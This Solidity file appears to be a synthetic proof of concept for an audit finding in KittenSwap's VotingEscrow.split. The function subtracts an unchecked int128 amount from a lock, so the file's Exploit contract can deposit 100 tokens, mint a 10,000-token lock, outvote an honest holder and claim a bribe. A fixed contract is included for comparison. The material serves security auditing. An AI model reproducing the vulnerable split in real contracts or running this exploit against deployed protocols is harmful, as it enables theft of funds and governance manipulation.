// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  KittenSwap VotingEscrow.split — arbitrary locked amount (Pashov, C-01, #58150).
    SYNTHETIC, cheatcode-free.
    split casts _amount to int128 and subtracts it from the locked amount with no
    upper bound. Signed subtraction does not revert when the result is merely
    negative. Deposit 100 LOCK, split 10_000 LOCK:
        token1.amount = -9_900 ether
        token2.amount = 10_000 ether
    The attacker votes and claims a bribe with the 10_000 figure, having
    deposited only 100. Control rejects _amount above the locked balance,
    and a fair split keeps the two children equal to the parent. */

contract Token {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _n, string memory _s) {
        name = _n;
        symbol = _s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract VotingEscrow {
    struct LockedBalance {
        int128 amount;
        uint256 end;
    }

    Token public immutable token;
    uint256 public nextId = 1;
    mapping(uint256 => LockedBalance) public locked;
    mapping(uint256 => address) public ownerOf;

    constructor(Token _token) {
        token = _token;
    }

    function create_lock(uint256 amount) external returns (uint256 id) {
        token.transferFrom(msg.sender, address(this), amount);
        id = nextId;
        nextId = id + 1;
        locked[id] = LockedBalance(int128(uint128(amount)), block.timestamp + 1);
        ownerOf[id] = msg.sender;
    }

    function split(uint256 _from, uint256 _amount) external returns (uint256 _tokenId1, uint256 _tokenId2) {
        require(ownerOf[_from] == msg.sender, "owner");
        require(_amount > 0, "Zero Split");

        LockedBalance memory _locked = locked[_from];
        int128 value = _locked.amount;
        locked[_from] = LockedBalance(0, 0);
        ownerOf[_from] = address(0);

        int128 _splitAmount = int128(uint128(_amount));
        // FIX: require(_splitAmount > 0 && _splitAmount <= value, "amount");
        _locked.amount = value - _splitAmount; // @> VULN: signed subtraction accepts an amount above the lock
        _tokenId1 = _mint(msg.sender, _locked);

        _locked.amount = _splitAmount;
        _tokenId2 = _mint(msg.sender, _locked);
    }

    function _mint(address who, LockedBalance memory L) internal returns (uint256 id) {
        id = nextId;
        nextId = id + 1;
        locked[id] = L;
        ownerOf[id] = who;
    }

    function votingPower(uint256 id) public view returns (uint256) {
        int128 amt = locked[id].amount;
        if (amt <= 0) return 0;
        return uint256(uint128(amt));
    }
}

contract VotingEscrowFixed {
    struct LockedBalance {
        int128 amount;
        uint256 end;
    }

    Token public immutable token;
    uint256 public nextId = 1;
    mapping(uint256 => LockedBalance) public locked;
    mapping(uint256 => address) public ownerOf;

    constructor(Token _token) {
        token = _token;
    }

    function create_lock(uint256 amount) external returns (uint256 id) {
        token.transferFrom(msg.sender, address(this), amount);
        id = nextId;
        nextId = id + 1;
        locked[id] = LockedBalance(int128(uint128(amount)), 1);
        ownerOf[id] = msg.sender;
    }

    function split(uint256 _from, uint256 _amount) external returns (uint256 _tokenId1, uint256 _tokenId2) {
        require(ownerOf[_from] == msg.sender, "owner");
        require(_amount > 0, "Zero Split");
        LockedBalance memory _locked = locked[_from];
        int128 value = _locked.amount;
        int128 _splitAmount = int128(uint128(_amount));
        require(_splitAmount <= value, "amount");
        locked[_from] = LockedBalance(0, 0);
        ownerOf[_from] = address(0);
        _locked.amount = value - _splitAmount;
        _tokenId1 = nextId;
        nextId = _tokenId1 + 1;
        locked[_tokenId1] = _locked;
        ownerOf[_tokenId1] = msg.sender;
        _locked.amount = _splitAmount;
        _tokenId2 = nextId;
        nextId = _tokenId2 + 1;
        locked[_tokenId2] = _locked;
        ownerOf[_tokenId2] = msg.sender;
    }
}

contract Governor {
    VotingEscrow public immutable ve;
    Token public immutable bribe;
    uint256 public yesVotes;
    uint256 public noVotes;

    constructor(VotingEscrow _ve, Token _bribe) {
        ve = _ve;
        bribe = _bribe;
    }

    function vote(uint256 id, bool yes) external {
        require(ve.ownerOf(id) == msg.sender, "owner");
        uint256 power = ve.votingPower(id);
        if (yes) {
            yesVotes += power;
        } else {
            noVotes += power;
        }
    }

    function claim(uint256 id, address to) external {
        require(yesVotes > noVotes, "not passed");
        require(ve.ownerOf(id) == msg.sender, "owner");
        uint256 power = ve.votingPower(id);
        bribe.transfer(to, power);
    }
}

contract Honest {
    function lockAndVote(Token lock, VotingEscrow ve, Governor gov, uint256 amount) external {
        lock.approve(address(ve), amount);
        uint256 id = ve.create_lock(amount);
        gov.vote(id, false);
    }
}

contract Exploit {
    uint256 public constant DEPOSIT = 100 ether;
    uint256 public constant INFLATED = 10_000 ether;

    Token public lockToken;
    Token public bribe;
    VotingEscrow public ve;
    Governor public gov;
    Honest public honest;
    uint256 public negativeId;
    uint256 public inflatedId;
    int128 public negativeAmount;
    int128 public inflatedAmount;

    constructor() {
        lockToken = new Token("Lock", "LOCK");
        bribe = new Token("Bribe", "BRIBE");
        ve = new VotingEscrow(lockToken);
        gov = new Governor(ve, bribe);
        honest = new Honest();
        lockToken.mint(address(honest), DEPOSIT);
        lockToken.mint(address(this), DEPOSIT);
        bribe.mint(address(gov), INFLATED);
    }

    function run() external {
        honest.lockAndVote(lockToken, ve, gov, DEPOSIT);
        require(gov.noVotes() == DEPOSIT, "honest weight");

        lockToken.approve(address(ve), DEPOSIT);
        uint256 id = ve.create_lock(DEPOSIT);
        (uint256 t1, uint256 t2) = ve.split(id, INFLATED);
        negativeId = t1;
        inflatedId = t2;

        (int128 neg, ) = ve.locked(t1);
        (int128 big, ) = ve.locked(t2);
        negativeAmount = neg;
        inflatedAmount = big;
        require(neg < 0, "token1 not negative");
        require(uint256(uint128(-neg)) == 9_900 ether, "token1 is -9900");
        require(big == int128(uint128(INFLATED)), "token2 is 10000");
        require(lockToken.balanceOf(address(ve)) == DEPOSIT * 2, "only 200 deposited");

        gov.vote(t2, true);
        require(gov.yesVotes() == INFLATED, "voted the inflated lock");
        require(gov.yesVotes() > gov.noVotes(), "outvoted");
        gov.claim(t2, msg.sender);
        require(bribe.balanceOf(msg.sender) == INFLATED, "claimed 10000");
    }
}
